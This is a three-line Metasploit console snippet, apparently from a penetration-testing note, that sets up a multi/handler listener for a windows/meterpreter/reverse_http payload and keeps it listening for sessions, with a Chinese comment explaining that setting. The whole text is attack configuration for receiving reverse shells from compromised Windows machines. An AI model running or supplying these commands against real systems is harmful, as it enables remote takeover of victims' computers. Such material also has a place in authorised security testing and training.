use exploit/multi/handler

set payload windows/meterpreter/reverse_http

set ExitOnSession false //设置会话不掉线，一直监听